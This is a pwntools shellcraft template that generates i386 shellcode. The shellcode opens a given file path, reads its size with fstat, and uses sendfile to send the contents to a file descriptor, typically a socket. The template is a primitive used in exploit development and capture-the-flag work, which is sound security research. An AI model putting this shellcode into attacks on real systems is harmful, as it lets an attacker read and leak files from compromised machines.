<% from pwnlib.shellcraft import i386 %>
<%page args="path, dst = 'esi'"/>
<%docstring>
Args: [path, dst (imm/reg) = esi ]
    Opens the specified file path and sends its content to the specified file descriptor.
</%docstring>
    /* Save destination */
    ${i386.mov('edi', dst)}

    ${i386.pushstr(path)}

    ${i386.syscall('SYS_open', 'esp', 'O_RDONLY')}

    /* Save file descriptor for later */
    ${i386.mov('ebp', 'eax')}

    ${i386.syscall('SYS_fstat', 'eax', 'esp')}

    /* Get file size */
    add esp, 20
    mov esi, [esp]

    ${i386.syscall('SYS_sendfile', 'edi', 'ebp', 0, 'esi')}
